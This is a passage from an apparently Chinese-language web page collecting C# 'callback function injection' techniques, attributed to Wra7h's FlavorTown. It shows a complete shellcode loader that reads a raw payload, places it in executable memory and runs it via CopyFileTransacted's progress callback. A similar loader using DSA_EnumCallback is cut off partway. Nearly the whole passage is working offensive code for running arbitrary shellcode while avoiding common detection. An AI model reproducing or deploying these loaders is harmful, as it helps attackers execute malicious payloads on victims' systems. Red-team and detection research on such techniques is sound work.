74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;hProv,<br><span class="linenum hljs-number"> 75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;szSubsystemProtocol<br><span class="linenum hljs-number"> 76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>)</span>;<br><span class="linenum hljs-number"> 77</span><br><span class="linenum hljs-number"> 78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"crypt32.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number"> 79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">CertFindChainInStore</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hCertStore,<br><span class="linenum hljs-number"> 81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwCertEncodingType,<br><span class="linenum hljs-number"> 82</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwFindFlags,<br><span class="linenum hljs-number"> 83</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwFindType,<br><span class="linenum hljs-number"> 84</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;CERT_CHAIN_FIND_BY_ISSUER_PARA&nbsp;pvFindPara,<br><span class="linenum hljs-number"> 85</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pPrevChainContext</span>)</span>;<br><span class="linenum hljs-number"> 86</span><br><span class="linenum hljs-number"> 87</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"crypt32.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number"> 88</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">CertCloseStore</span>(<span class="hljs-params">IntPtr&nbsp;storeProvider,&nbsp;<span class="hljs-keyword">int</span>&nbsp;flags</span>)</span>;<br><span class="linenum hljs-number"> 89</span><br><span class="linenum hljs-number"> 90</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;CERT_CHAIN_FIND_BY_ISSUER_PARA<br><span class="linenum hljs-number"> 91</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 92</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;cbSize;<br><span class="linenum hljs-number"> 93</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">string</span>&nbsp;pszUsageIdentifier;<br><span class="linenum hljs-number"> 94</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwKeySpec;<br><span class="linenum hljs-number"> 95</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwAcquirePrivateKeyFlags;<br><span class="linenum hljs-number"> 96</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;cIssuer;<br><span class="linenum hljs-number"> 97</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;rgIssuer;<br><span class="linenum hljs-number"> 98</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;pfnFindCallback;<br><span class="linenum hljs-number"> 99</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;pvFindArg;<br><span class="linenum hljs-number">100</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwIssuerChainIndex;<br><span class="linenum hljs-number">101</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwIssuerElementIndex;<br><span class="linenum hljs-number">102</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">103</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">104</span>}<br></code></pre>
<h1 id="h2ccopyfiletransacted"><span>2.回调函数注入 (C#) 通过 CopyFileTransacted</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">CopyFileTransacted</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;CopyFileTransacted.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(Process.GetCurrentProcess().Handle,&nbsp;hAlloc,<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,&nbsp;<span class="hljs-number">0x20</span><span class="hljs-comment">/*RX*/</span>,&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;szTempFile&nbsp;=&nbsp;System.IO.Path.GetTempFileName();<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hTransaction&nbsp;=&nbsp;CreateTransaction(IntPtr.Zero,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-keyword">string</span>.Empty);<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CopyFileTransacted(<span class="hljs-string">@"C:\Windows\notepad.exe"</span>,&nbsp;szTempFile,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0x0</span>,&nbsp;hTransaction);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Cleanup</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.IO.File.Delete(szTempFile);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hTransaction);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">59</span><br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"KtmW32.dll"</span>)</span>]<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">CreateTransaction</span>(<span class="hljs-params">IntPtr&nbsp;lpTransactionAttributes,&nbsp;IntPtr&nbsp;UOW,&nbsp;<span class="hljs-keyword">uint</span>&nbsp;CreateOptions,&nbsp;<span class="hljs-keyword">uint</span>&nbsp;IsolationLevel,&nbsp;<span class="hljs-keyword">uint</span>&nbsp;IsolationFlags,&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Timeout,&nbsp;<span class="hljs-keyword">string</span>&nbsp;Description</span>)</span>;<br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">CopyFileTransacted</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>&nbsp;lpExistingFileName,&nbsp;<span class="hljs-keyword">string</span>&nbsp;lpNewFileName,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpProgressRoutine,&nbsp;IntPtr&nbsp;lpData,&nbsp;Int32&nbsp;pbCancel,<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwCopyFlags,&nbsp;IntPtr&nbsp;hTransaction</span>)</span>;<br><span class="linenum hljs-number">67</span><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">CloseHandle</span>(<span class="hljs-params">IntPtr&nbsp;hObject</span>)</span>;<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">71</span>}<br></code></pre>
<h1 id="h3cdsa_enumcallback"><span>3.回调函数注入 (C#) 通过 DSA_EnumCallback</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">DSA_EnumCallback</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;DSA_EnumCallback.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum 